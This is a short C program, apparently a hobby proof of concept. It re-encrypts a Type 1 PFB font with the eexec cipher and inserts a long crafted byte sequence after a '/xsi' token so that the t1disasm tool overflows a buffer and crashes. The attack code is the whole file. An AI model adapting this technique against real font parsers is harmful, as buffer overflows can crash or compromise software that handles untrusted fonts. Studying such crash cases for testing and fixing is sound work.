// This program modifies the pfb file to be even more invalid, and #
// overflow a buffer in t1disasm, causing the latter to crash.  There's
// no real point to this-- it's just for fun.
// (it was a Python script but it was too slow after I realized I needed 0x30000 zeroes)

#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

struct cctx {
    uint16_t c1, c2, r;
};

static inline void cinit(uint16_t *r) {
    *r = 55665;
}

static inline uint8_t ccrypt(uint16_t *r, uint8_t c, bool decrypt) {
    uint8_t new_c = c ^ (*r >> 8);
    *r = ((decrypt ? c : new_c) + (*r))*52845 + 22719;
    return new_c;
}

int main(int argc, char **argv) {
    int ifd = open(argv[1], O_RDONLY);
    assert(ifd != -1);
    int ofd = open(argv[2], O_RDWR | O_CREAT | O_TRUNC, 0644);
    assert(ofd != -1);

    size_t isize = (size_t) lseek(ifd, 0, SEEK_END);
    uint8_t *iptr = mmap(NULL, isize, PROT_READ | PROT_WRITE, MAP_PRIVATE, ifd, 0);
    assert(iptr != MAP_FAILED);

    size_t osize = isize + 0x1000;
    assert(!ftruncate(ofd, osize));
    uint8_t *optr = mmap(NULL, osize, PROT_READ | PROT_WRITE, MAP_SHARED, ofd, 0);
    assert(optr != MAP_FAILED);

    uint8_t *base = iptr;
    iptr = (uint8_t *) strnstr((char *) iptr + 10, "currentfile eexec", isize - 10);
    assert(iptr);
    iptr += strlen("currentfile eexec\n") + 2;
    memcpy(optr, base, iptr - base);
    optr += (iptr - base);

    size_t bsize = *((uint32_t *) iptr);
    *((size_t *) optr) = bsize + 0x1000;
    iptr += 4;
    optr += 4;

    uint16_t ir, or;
    cinit(&ir);
    cinit(&or);

    printf("bsize = %zd\n", bsize);
    char buf[4]; memset(buf, 0, 4);
    for(size_t i = 0; i < bsize; i++) {
        uint8_t c = ccrypt(&ir, *iptr++, true);
        *optr++ = ccrypt(&or, c, false);
        if(!memcmp(buf, "/xsi", 4)) {
            // try to find a repetitive sequence - should be possible
                        

            // loop: r = 64 = (229*52845 + 22719)
            //       c = 165
            uint8_t c_ = (229 - or) ^ (or >> 8);
            *optr++ = ccrypt(&or, c_, false);
            for(int j = 0; j < 0xfff; j++) {
                printf("%hd\n", or);
                *optr++ = ccrypt(&or, 165, false);
            }
        }
        memcpy(buf, buf + 1, 3); buf[3] = (char) c;
    }
    
    memcpy(optr, iptr, isize - (iptr - base));

    return 0;
}
